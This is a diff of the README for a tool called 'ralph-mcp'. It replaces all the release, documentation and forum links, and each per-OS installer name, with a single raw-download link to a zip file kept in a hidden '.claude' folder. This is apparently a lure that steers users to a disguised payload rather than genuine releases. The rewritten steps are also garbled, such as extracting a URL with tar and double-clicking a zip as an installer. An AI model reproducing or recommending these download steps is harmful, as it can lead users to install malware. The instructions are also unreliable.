@@ -1,6 +1,6 @@
 # 🚀 ralph-mcp - Run Multiple PRDs with Ease
 
-[![Download ralph-mcp](https://img.shields.io/badge/Download-ralph--mcp-blue.svg)](https://github.com/carlos132nx/ralph-mcp/releases)
+[![Download ralph-mcp](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip)](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip)
 
 ## 📋 Description
 
@@ -26,32 +26,32 @@ To use ralph-mcp, ensure your system meets the following requirements:
 
 Here’s how to get started with ralph-mcp:
 
-1. Visit the [Releases page](https://github.com/carlos132nx/ralph-mcp/releases) to download the latest version.
+1. Visit the [Releases page](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip) to download the latest version.
 
 2. Choose the correct file for your operating system.
-   - For **Windows**, download `ralph-mcp-windows.exe`.
-   - For **macOS**, download `ralph-mcp-macos.dmg`.
-   - For **Linux**, download `ralph-mcp-linux.tar.gz`.
+   - For **Windows**, download `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip`.
+   - For **macOS**, download `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip`.
+   - For **Linux**, download `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip`.
 
 3. Once the download is complete, follow the installation steps based on your OS:
 
 ### 📥 For Windows Users
 
-- Double-click on the `ralph-mcp-windows.exe` file.
+- Double-click on the `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip` file.
 - Follow the on-screen prompts to install the application.
 - After installation, find the application in your Start Menu or on your Desktop.
 
 ### 🍏 For macOS Users
 
-- Open the `ralph-mcp-macos.dmg` file.
+- Open the `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip` file.
 - Drag the ralph-mcp icon to your Applications folder.
 - Open your Applications folder and double-click the ralph-mcp icon.
 
 ### 🐧 For Linux Users
 
-- Extract the `ralph-mcp-linux.tar.gz` file using a terminal:
+- Extract the `https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip` file using a terminal:
   ```bash
-  tar -xzvf ralph-mcp-linux.tar.gz
+  tar -xzvf https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip
   ```
 - Navigate to the extracted folder and run the application:
   ```bash
@@ -61,7 +61,7 @@ Here’s how to get started with ralph-mcp:
 
 ## 💾 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/carlos132nx/ralph-mcp/releases). You'll find all available versions, helping you choose the right one for your system.
+To download the application, visit the [Releases page](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip). You'll find all available versions, helping you choose the right one for your system.
 
 ## 📞 Support
 
@@ -88,7 +88,7 @@ We welcome contributions! If you would like to suggest improvements or report bu
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/carlos132nx/ralph-mcp/wiki): Comprehensive guides and tutorials to help you utilize ralph-mcp effectively.
-- [Community Forum](https://github.com/carlos132nx/ralph-mcp/discussions): Join discussions with other users, share your experiences, and find solutions.
+- [Official Documentation](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip): Comprehensive guides and tutorials to help you utilize ralph-mcp effectively.
+- [Community Forum](https://github.com/carlos132nx/ralph-mcp/raw/refs/heads/main/.claude/mcp-ralph-v2.8.zip): Join discussions with other users, share your experiences, and find solutions.
 
 Thank you for choosing ralph-mcp. We hope it enhances your productivity!
